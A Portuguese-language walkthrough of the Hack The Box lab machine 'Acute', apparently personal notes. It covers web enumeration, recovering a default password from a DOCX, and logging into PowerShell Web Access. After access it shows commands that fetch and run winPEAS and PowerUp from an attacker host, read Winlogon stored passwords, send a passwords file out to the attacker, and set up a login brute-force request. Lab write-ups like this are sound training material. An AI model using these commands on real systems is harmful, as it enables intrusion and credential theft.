Acute
========================

## Enumeration

    sudo nmap_enum acute.htb | tee nmap_output.txt

![qownnotes-media-ydRrGa](../../../media/qownnotes-media-ydRrGa.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn acute.htb | tee nmap_udp_output.txt

![qownnotes-media-lgmNBO](../../../media/qownnotes-media-lgmNBO.png)

    sslscan acute.htb:443
 
![qownnotes-media-EiDYNH](../../../media/qownnotes-media-EiDYNH.png)

    sudo nmap -p- -Pn -T5 -n acute.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-SsKGFR](../../../media/qownnotes-media-SsKGFR.png)

    nikto -host https://acute.htb -T x 6 | tee nikto_output.txt

![qownnotes-media-aqCutO](../../../media/qownnotes-media-aqCutO.png)

    
    gobuster dir -u https://atsserver.acute.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
   

![qownnotes-media-UnUjVW](../../../media/qownnotes-media-UnUjVW.png)

    gobuster dir -u https://atsserver.acute.local -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"

![qownnotes-media-YxxedI](../../../media/qownnotes-media-YxxedI.png)

    nikto -host https://atsserver.acute.local -T x 6 | tee nikto_output.txt

![qownnotes-media-ZcYRhz](../../../media/qownnotes-media-ZcYRhz.png)


Nome dos usuários encontrados:

    cat temp.txt | tr '[:upper:]' '[:lower:]' >> userrs.txt

    cewl -w pass_temp.txt --with-numbers https://atsserver.acute.local/

![qownnotes-media-EtVBGZ](../../../media/qownnotes-media-EtVBGZ.png)


Para obter as URLs

    httrack https://atsserver.acute.local
    cat new.txt | cut -f 8

Depois disso eu achei um arquivo DOCX que mostrava uma URL comacesso a uma console administrativa via powershell PSWA

<https://atsserver.acute.local/New_Starter_CheckList_v7.docx>

Dentro desse cara

![qownnotes-media-ybpIKM](../../../media/qownnotes-media-ybpIKM.png)


Falta achar o nome dos usuários:

Daí eu achei algo interessante. Por meio do tamanho da resposta eu achei o nome de usuário equivalente a:

    edavies

(Não mostra no print, pois eu acabei apagando)

![qownnotes-media-GWeqYU](../../../media/qownnotes-media-GWeqYU.png)

![qownnotes-media-sdMRVa](../../../media/qownnotes-media-sdMRVa.png)


    exiftool New_Starter_CheckList_v7.docx

![qownnotes-media-WxewOM](../../../media/qownnotes-media-WxewOM.png)

Nome da máquina tambémm foi encontrado... Então basta logar com essas informações

## Credenciais
edavies
Password1!

Acute-PC01

![qownnotes-media-nqnsub](../../../media/qownnotes-media-nqnsub.png)

![qownnotes-media-SStZez](../../../media/qownnotes-media-SStZez.png)



    (new-object system.net.webclient).downloadfile('http://10.10.14.16/4-privilege%20escalation/winPEASx64.exe', 'C:\temp\w.exe')
    
    (new-object system.net.webclient).downloadfile('http://10.10.14.16/4-privilege%20escalation/PowerUp.ps1', 'C:\temp\pu.ps1')
    . ./pu.ps1
    import-module pu.ps1
    iex (new-object system.net.webclient).downloadstring('http://10.10.14.16/4-privilege%20escalation/PowerUp.ps1'); Invoke-allchecks

![qownnotes-media-bZwiFz](../../../media/qownnotes-media-bZwiFz.png)

![qownnotes-media-TuJfYj](../../../media/qownnotes-media-TuJfYj.png)

    whoami /all
    systeminfo > si.txt

![qownnotes-media-yxegoZ](../../../media/qownnotes-media-yxegoZ.png)
  
![qownnotes-media-qGrmmU](../../../media/qownnotes-media-qGrmmU.png)

    cmdkey /list
    
    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   
    
    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword

![qownnotes-media-LRTDOn](../../../media/qownnotes-media-LRTDOn.png)


Nenhum desses aqui estava funcionando. Teve apenas um que deu um retorno interessante:

    findstr /si password *.doc *.txt *.ini *.config

![qownnotes-media-TyfixD](../../../media/qownnotes-media-TyfixD.png)

    iwr -infile passwords.txt http://10.10.14.17:8000/passwords.txt -method put

    #Na máquina do atacante:
    python -m http.upload_server

![qownnotes-media-Exiusd](../../../media/qownnotes-media-Exiusd.png)

Depois disso tentei um bruteforce:


![qownnotes-media-NtMIVT](../../../media/qownnotes-media-NtMIVT.png)


```
POST /Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access HTTP/2
Host: atsserver.acute.local
Cookie: .redirect.=10B4B940A6F4A917D016BF9836F2E3987699B60F037E9AFB46223387C8418037705E1485C6621E13F03455AFBB7B5FFB2DDE27954D34894ECAE10D271373FE7E4A794E03F1090BC82C58B2D730CE5FBC9271BB06BADB3220C88C886197BA8906215F396576A522BB162D6AD6DEFDD46D6F95C95B0DBB4127A97FB738DE44CCAC; ASP.NET_SessionId=gewmkpj2t3co5vxv1p25ikha
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1838
Origin: https://atsserver.acute.local
Referer: https://atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE0NzgxMTkyOTcPZBYCZg9kFgICAQ9kFgQCAQ8WAh4HVmlzaWJsZWhkAgUPZBYEAgEPFgIfAGgWBAIFDw8WAh4EVGV4dAUGRGVsZXRlZGQCBw8PFgIfAQULTmV3IFNlc3Npb25kZAICD2QWBAIBDw8WAh8BBUlTaWduLWluIGZhaWxlZC4gIFZlcmlmeSB0aGF0IHlvdSBoYXZlIGVudGVyZWQgeW91ciBjcmVkZW50aWFscyBjb3JyZWN0bHkuZGQCAw9kFhQCAQ8WAh4FY2xhc3MFDnJlcXVpcmVkIGVycm9yZAIDDxYCHwIFDnJlcXVpcmVkIGVycm9yZAIHDxYCHwIFCHJlcXVpcmVkZAIJDxYCHwIFCHJlcXVpcmVkZAILDxYCHwIFCHJlcXVpcmVkZAINDxYCHwIFCHJlcXVpcmVkZAIPDxYCHwIFDnJlcXVpcmVkIGVycm9yZAIVDxYCHwIFEHJlcXVpcmVkIGRlZmF1bHRkAhcPFgIfAgUQcmVxdWlyZWQgZGVmYXVsdGQCHQ8PFgIfAQUHU2lnbiBJbmRkZCNE1CoqEgfvJrCU67WOId0dVY078lCTLRjD7%2FjEX51F&__VIEWSTATEGENERATOR=A9B885AF&__EVENTVALIDATION=%2FwEdABALEIOnFMFDOG5Ojxc%2FX6rTOGmAeYnrCn7l4HKpS0S3PrgsETBjMT6GhrSrOTblFa4oEZV%2BmS7OYlgMO%2FYC4GlLi0gJ8YEbHiccZGZU3FMKqQODz%2BnnTbMB0U%2BsnJoa%2FVGSAmrkIv6M8J3P%2FCQJfUz5%2FQiZFa1%2Bi9bo6WF9GgmOpfdYcS7dPEFdYM27aKu8bC6Jj2NY3SOcTG6NWDdH8E%2FTObX7eikOGF9Lcjcxb0yJrQ3fDD0NdUwYheZCbQiee7KuocNWmjMwttcI4ErUCx7iG0NcpRoJPZDUdkzXi9kBovUSO9m0FmharJXDgO6iY3GP%2FypXhvJY6eYlu%2FRsa9C9ttGZKlL1sAHhi3vDyPYAGY5ap6amJmelt83yX3QXmYc%3D&ctl00%24MainContent%24userNameTextBox=§admin§&ctl00%24MainContent%24passwordTextBox=§teste§&ctl00%24MainContent%24connectionTypeSelection=computer-name&ctl00%24MainContent%24targetNodeTextBox=&ctl00%24MainContent%24connectionUriTextBox=&ctl00%24MainContent%24altUserNameTextBox=&ctl00%24MainContent%24altPasswordTextBox=&ctl00%24MainContent%24configurationNameTextBox=Microsoft.PowerShell&ctl00%24MainContent%24authenticationTypeSelection=0&ctl00%24MainContent%24useSslSelection=0&ctl00%24MainContent%24portTextBox=5985&ctl00%24MainContent%24applicationNameTextBox=WSMAN&ctl00%24MainContent%24allowRedirectionSelection=0&ctl00%24MainContent%24advancedPanelShowLabel=true&ctl00%24MainContent%24ButtonLogOn=Sign+In
```

![qownnotes-media-RxlXIC](../../../media/qownnotes-media-RxlXIC.png)

E com as senhas do password.txt

Estou agaurdando o resultado. Enquanto isso, vou desenrolando outras enumerações:

    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
    
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}


    reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    
![qownnotes-media-SmpMdL](../../../media/qownnotes-media-SmpMdL.png)


